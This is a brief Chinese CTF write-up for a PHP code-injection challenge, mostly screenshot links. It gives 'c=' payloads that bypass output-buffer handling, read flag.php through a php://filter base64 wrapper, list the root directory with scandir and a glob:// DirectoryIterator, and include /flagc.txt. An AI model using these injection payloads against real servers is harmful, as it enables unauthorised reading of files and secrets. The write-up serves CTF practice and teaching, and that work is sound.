![image-20250404165825935](./assets/image-20250404165825935.png)

![image-20250404165830244](./assets/image-20250404165830244.png)



同样存在缓冲区劫持

绕过

![image-20250404165849531](./assets/image-20250404165849531.png)

读取flag

```
c=include("php://filter/convert.base64-encode/resource=flag.php");die();
```

![image-20250404165932298](./assets/image-20250404165932298.png)

![image-20250404165947919](./assets/image-20250404165947919.png)



还是不在这里

读取根目录

```
c=var_export(scandir("/"));die();
```

![image-20250404170013773](./assets/image-20250404170013773.png)

读取flagc.txt

```
c=include("/flagc.txt");die();
```

![image-20250404170039319](./assets/image-20250404170039319.png)



或者利用glob伪协议读取根目录内容

```
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?>
```

![image-20250404170358957](./assets/image-20250404170358957.png)